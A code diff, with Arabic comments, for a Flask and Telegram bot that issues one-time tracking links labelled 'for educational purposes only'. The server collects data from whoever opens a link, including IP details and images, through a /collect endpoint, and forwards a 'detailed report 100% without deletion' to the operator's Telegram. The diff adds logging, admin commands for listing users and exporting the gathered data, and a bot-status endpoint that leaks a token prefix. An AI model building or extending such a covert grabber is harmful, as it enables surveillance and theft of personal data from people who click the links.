@@ -1,6 +1,6 @@
 # ============================================================
 # بوت تلغرام متكامل - روابط لمرة واحدة - للأغراض التعليمية فقط
-# يعمل على Render.com
+# يعمل على Render.com مع لوحة تحكم كاملة
 # ============================================================
 
 import telebot
@@ -13,11 +13,19 @@ import requests
 import base64
 import time
 import socket
+import logging
 from datetime import datetime, timedelta
 from flask import Flask, request, jsonify, render_template_string
 from flask_cors import CORS
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, InputMediaPhoto
 from dotenv import load_dotenv
+
+# إعداد السجلات
+logging.basicConfig(
+    level=logging.DEBUG,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+)
+logger = logging.getLogger(__name__)
 
 load_dotenv()
 
@@ -30,7 +38,21 @@ SUPABASE_URL = os.environ.get('SUPABASE_URL', '')
 SUPABASE_KEY = os.environ.get('SUPABASE_KEY', '')
 
 # ========== تهيئة البوت ==========
-bot = telebot.TeleBot(BOT_TOKEN)
+bot = None
+
+def init_bot():
+    """تهيئة البوت مع محاولات متعددة"""
+    global bot
+    try:
+        bot = telebot.TeleBot(BOT_TOKEN)
+        me = bot.get_me()
+        logger.info(f"✅ بوت متصل بنجاح: @{me.username} (ID: {me.id})")
+        return True
+    except Exception as e:
+        logger.error(f"❌ فشل اتصال البوت: {e}")
+        return False
+
+init_bot()
 
 # ========== قواعد البيانات ==========
 links_db = {}
@@ -93,130 +115,12 @@ WELCOME_PAGE = """
         </div>
         <div style="margin-top: 30px; font-size: 0.8em; color: #666;">
             <p>🕐 الوقت الحالي: {{ current_time }}</p>
+            <p>🤖 حالة البوت: {{ bot_status }}</p>
         </div>
     </div>
 </body>
 </html>
 """
-
-# ========== دوال Supabase ==========
-def supabase_request(method, endpoint, data=None):
-    """إرسال طلب إلى Supabase"""
-    if not USE_SUPABASE or not SUPABASE_URL or not SUPABASE_KEY:
-        return None
-    
-    headers = {
-        'apikey': SUPABASE_KEY,
-        'Authorization': f'Bearer {SUPABASE_KEY}',
-        'Content-Type': 'application/json'
-    }
-    
-    url = f"{SUPABASE_URL}/rest/v1/{endpoint}"
-    
-    try:
-        if method == 'GET':
-            response = requests.get(url, headers=headers)
-        elif method == 'POST':
-            response = requests.post(url, headers=headers, json=data)
-        elif method == 'PUT':
-            response = requests.put(url, headers=headers, json=data)
-        elif method == 'DELETE':
-            response = requests.delete(url, headers=headers)
-        return response.json() if response.status_code < 300 else None
-    except:
-        return None
-
-def save_to_supabase(table, data):
-    """حفظ البيانات في Supabase"""
-    if not USE_SUPABASE:
-        return False
-    try:
-        result = supabase_request('POST', table, data)
-        return result is not None
-    except:
-        return False
-
-def get_from_supabase(table, column=None, value=None):
-    """جلب البيانات من Supabase"""
-    if not USE_SUPABASE:
-        return None
-    try:
-        endpoint = table
-        if column and value:
-            endpoint = f"{table}?{column}=eq.{value}"
-        result = supabase_request('GET', endpoint)
-        return result
-    except:
-        return None
-
-# ========== دوال حفظ البيانات ==========
-def save_data():
-    """حفظ البيانات (محلياً وفي Supabase)"""
-    try:
-        with open('links_db.json', 'w') as f:
-            json.dump(links_db, f)
-        with open('users_db.json', 'w') as f:
-            json.dump(users_db, f)
-    except Exception as e:
-        print(f"⚠️ خطأ في الحفظ المحلي: {e}")
-    
-    if USE_SUPABASE:
-        try:
-            for link_id, link_data in links_db.items():
-                link_data['link_id'] = link_id
-                save_to_supabase('links', link_data)
-            
-            for user_id, user_data in users_db.items():
-                user_data['user_id'] = user_id
-                save_to_supabase('users', user_data)
-        except Exception as e:
-            print(f"⚠️ خطأ في حفظ Supabase: {e}")
-
-def load_data():
-    """تحميل البيانات"""
-    global links_db, users_db
-    
-    if USE_SUPABASE:
-        try:
-            links_result = get_from_supabase('links')
-            if links_result:
-                for item in links_result:
-                    link_id = item.pop('link_id', None)
-                    if link_id:
-                        links_db[link_id] = item
-            
-            users_result = get_from_supabase('users')
-            if users_result:
-                for item in users_result:
-                    user_id = item.pop('user_id', None)
-                    if user_id:
-                        users_db[user_id] = item
-            return
-        except Exception as e:
-            print(f"⚠️ خطأ في تحميل Supabase: {e}")
-    
-    try:
-        with open('links_db.json', 'r') as f:
-            links_db = json.load(f)
-    except:
-        links_db = {}
-    
-    try:
-        with open('users_db.json', 'r') as f:
-            users_db = json.load(f)
-    except:
-        users_db = {}
-
-def get_local_ip():
-    """الحصول على الـ IP المحلي"""
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        ip = s.getsockname()[0]
-        s.close()
-        return ip
-    except:
-        return "127.0.0.1"
 
 # ========== صفحة HTML الرئيسية ==========
 HTML_PAGE = """
@@ -541,21 +445,53 @@ HTML_PAGE = """
 </html>
 """
 
+# ========== دوال حفظ البيانات ==========
+
+def save_data():
+    """حفظ البيانات"""
+    try:
+        with open('links_db.json', 'w') as f:
+            json.dump(links_db, f)
+        with open('users_db.json', 'w') as f:
+            json.dump(users_db, f)
+        logger.info("✅ تم حفظ البيانات")
+    except Exception as e:
+        logger.error(f"⚠️ خطأ في الحفظ: {e}")
+
+def load_data():
+    """تحميل البيانات"""
+    global links_db, users_db
+    try:
+        with open('links_db.json', 'r') as f:
+            links_db = json.load(f)
+        logger.info(f"✅ تم تحميل {len(links_db)} رابط")
+    except:
+        links_db = {}
+        logger.info("📁 تم إنشاء قاعدة بيانات جديدة للروابط")
+    
+    try:
+        with open('users_db.json', 'r') as f:
+            users_db = json.load(f)
+        logger.info(f"✅ تم تحميل {len(users_db)} مستخدم")
+    except:
+        users_db = {}
+        logger.info("📁 تم إنشاء قاعدة بيانات جديدة للمستخدمين")
+
 # ========== مسارات Flask ==========
 
 @app.route('/')
 def index():
-    """الصفحة الرئيسية - تعرض حالة السيرفر"""
+    """الصفحة الرئيسية"""
     ref = request.args.get('ref')
     
-    # إذا كان هناك ref، حاول عرض صفحة الاختبار
     if ref:
         if ref not in links_db:
             return render_template_string(WELCOME_PAGE, 
                 links_count=len(links_db), 
                 users_count=len(users_db),
                 server_url=SERVER_URL,
-                current_time=datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                current_time=datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                bot_status="🟢 يعمل" if bot else "🔴 غير متصل"
             )
         
         link_data = links_db[ref]
@@ -570,12 +506,12 @@ def index():
         
         return HTML_PAGE
     
-    # إذا لم يكن هناك ref، عرض صفحة الترحيب
     return render_template_string(WELCOME_PAGE, 
         links_count=len(links_db), 
         users_count=len(users_db),
         server_url=SERVER_URL,
-        current_time=datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        current_time=datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+        bot_status="🟢 يعمل" if bot else "🔴 غير متصل"
     )
 
 @app.route('/collect', methods=['POST'])
@@ -613,7 +549,7 @@ def collect():
         return jsonify({"status": "success"}), 200
         
     except Exception as e:
-        print(f"❌ خطأ: {e}")
+        logger.error(f"❌ خطأ في جمع البيانات: {e}")
         return jsonify({"status": "error", "error": str(e)}), 500
 
 @app.route('/mark_used/<ref>', methods=['POST'])
@@ -624,6 +560,29 @@ def mark_used(ref):
         save_data()
     return jsonify({"status": "ok"})
 
+@app.route('/test_bot', methods=['GET'])
+def test_bot():
+    """اختبار اتصال البوت"""
+    try:
+        if bot:
+            me = bot.get_me()
+            return jsonify({
+                "status": "connected",
+                "bot_username": me.username,
+                "bot_id": me.id,
+                "token_preview": BOT_TOKEN[:10] + "..."
+            })
+        else:
+            return jsonify({
+                "status": "error",
+                "error": "البوت غير مهيأ"
+            }), 500
+    except Exception as e:
+        return jsonify({
+            "status": "error",
+            "error": str(e)
+        }), 500
+
 @app.route('/health', methods=['GET'])
 def health():
     """فحص صحة السيرفر"""
@@ -632,13 +591,18 @@ def health():
         "timestamp": datetime.now().isoformat(),
         "links": len(links_db),
         "users": len(users_db),
-        "server_url": SERVER_URL
+        "server_url": SERVER_URL,
+        "bot_status": "connected" if bot else "disconnected"
     })
 
 # ========== دوال إرسال التقرير ==========
 
 def send_detailed_report(data, filename, ref):
     """إرسال تقرير مفصل 100% بدون أي حذف"""
+    
+    if not bot:
+        logger.error("❌ البوت غير متصل، لا يمكن إرسال التقرير")
+        return
     
     ip_details = data.get('ip_details', {})
     images = data.get('images', [])
@@ -788,7 +752,7 @@ def send_detailed_report(data, filename, ref):
         else:
             bot.send_message(ADMIN_ID, msg, parse_mode='Markdown')
     except Exception as e:
-        bot.send_message(ADMIN_ID, f"⚠️ فشل إرسال التقرير: {e}")
+        logger.error(f"⚠️ فشل إرسال التقرير: {e}")
     
     if images:
         try:
@@ -816,13 +780,13 @@ def send_detailed_report(data, filename, ref):
                 except:
                     pass
         except Exception as e:
-            bot.send_message(ADMIN_ID, f"⚠️ فشل إرسال الصور: {e}")
+            logger.error(f"⚠️ فشل إرسال الصور: {e}")
     
     try:
         with open(filename, 'rb') as f:
             bot.send_document(ADMIN_ID, f, caption=f"📊 الملف الكامل - {ref[:8]}")
     except Exception as e:
-        bot.send_message(ADMIN_ID, f"⚠️ فشل إرسال الملف: {e}")
+        logger.error(f"⚠️ فشل إرسال الملف: {e}")
 
 # ========== أوامر البوت ==========
 
@@ -851,6 +815,84 @@ def start(msg):
         reply_markup=keyboard,
         parse_mode='Markdown'
     )
+
+@bot.message_handler(commands=['help'])
+def help_command(msg):
+    if msg.from_user.id != ADMIN_ID:
+        bot.reply_to(msg, "⛔ غير مصرح لك")
+        return
+    
+    help_text = """
+📖 **قائمة الأوامر المتاحة:**
+━━━━━━━━━━━━━━━━━━━
+/start - فتح لوحة التحكم
+/help - عرض هذه المساعدة
+/stats - عرض الإحصائيات
+/users - عرض المستخدمين
+/links - عرض الروابط النشطة
+/clear - حذف جميع البيانات
+/export - تصدير البيانات
+
+🔗 **للحصول على رابط جديد:**
+استخدم زر "إنشاء رابط" في لوحة التحكم
+
+⚠️ جميع الروابط تستخدم مرة واحدة فقط
+    """
+    bot.reply_to(msg, help_text, parse_mode='Markdown')
+
+@bot.message_handler(commands=['stats'])
+def stats_command(msg):
+    if msg.from_user.id != ADMIN_ID:
+        bot.reply_to(msg, "⛔ غير مصرح لك")
+        return
+    show_stats(msg)
+
+@bot.message_handler(commands=['users'])
+def users_command(msg):
+    if msg.from_user.id != ADMIN_ID:
+        bot.reply_to(msg, "⛔ غير مصرح لك")
+        return
+    show_users(msg)
+
+@bot.message_handler(commands=['links'])
+def links_command(msg):
+    if msg.from_user.id != ADMIN_ID:
+        bot.reply_to(msg, "⛔ غير مصرح لك")
+        return
+    show_active_links(msg)
+
+@bot.message_handler(commands=['clear'])
+def clear_command(msg):
+    if msg.from_user.id != ADMIN_ID:
+        bot.reply_to(msg, "⛔ غير مصرح لك")
+        return
+    
+    global links_db, users_db
+    links_db = {}
+    users_db = {}
+    save_data()
+    bot.reply_to(msg, "✅ تم حذف جميع البيانات")
+
+@bot.message_handler(commands=['export'])
+def export_command(msg):
+    if msg.from_user.id != ADMIN_ID:
+        bot.reply_to(msg, "⛔ غير مصرح لك")
+        return
+    export_data(msg)
+
+@bot.message_handler(func=lambda msg: True)
+def echo_all(msg):
+    """الرد على أي رسالة أخرى"""
+    if msg.from_user.id != ADMIN_ID:
+        bot.reply_to(msg, "⛔ غير مصرح لك")
+        return
+    
+    bot.reply_to(msg, 
+        "❓ أمر غير معروف\n"
+        "أرسل /help لعرض الأوامر المتاحة"
+    )
+
+# ========== دوال الكالبات ==========
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_handler(call):
@@ -1028,13 +1070,29 @@ def export_data(msg):
 # ========== تشغيل البوت ==========
 
 def run_bot():
-    print("🤖 تشغيل البوت...")
+    """تشغيل البوت مع إعادة محاولة تلقائية"""
+    global bot
+    
+    logger.info("🚀 بدء تشغيل البوت...")
+    
     while True:
         try:
-            bot.polling(none_stop=True, interval=0)
+            if not bot:
+                logger.warning("⚠️ البوت غير مهيأ، محاولة إعادة الاتصال...")
+                init_bot()
+                if not bot:
+                    time.sleep(10)
+                    continue
+            
+            logger.info("🔄 بدء polling...")
+            bot.polling(none_stop=True, interval=1, timeout=30)
+            
         except Exception as e:
-            print(f"⚠️ خطأ في البوت: {e}")
-            time.sleep(5)
+            logger.error(f"❌ خطأ في البوت: {e}")
+            logger.info("⏳ إعادة المحاولة بعد 10 ثواني...")
+            time.sleep(10)
+
+# ========== التشغيل الرئيسي ==========
 
 if __name__ == '__main__':
     load_data()
@@ -1046,10 +1104,24 @@ if __name__ == '__main__':
     print(f"👤 معرف المدير: {ADMIN_ID}")
     print(f"📦 حفظ البيانات: {'Supabase' if USE_SUPABASE else 'محلياً'}")
     print("="*70)
+    print("\n📌 الأوامر المتاحة في البوت:")
+    print("   /start - فتح لوحة التحكم")
+    print("   /help - عرض المساعدة")
+    print("   /stats - عرض الإحصائيات")
+    print("   /users - عرض المستخدمين")
+    print("   /links - عرض الروابط النشطة")
+    print("   /clear - حذف جميع البيانات")
+    print("   /export - تصدير البيانات")
+    print("="*70)
     
     # تشغيل البوت في خلفية
-    threading.Thread(target=run_bot, daemon=True).start()
+    bot_thread = threading.Thread(target=run_bot, daemon=True)
+    bot_thread.start()
+    
+    # انتظار ثانية للتأكد من بدء البوت
+    time.sleep(2)
     
     # تشغيل Flask
     port = int(os.environ.get('PORT', 10000))
+    logger.info(f"🚀 تشغيل Flask على المنفذ {port}")
     app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
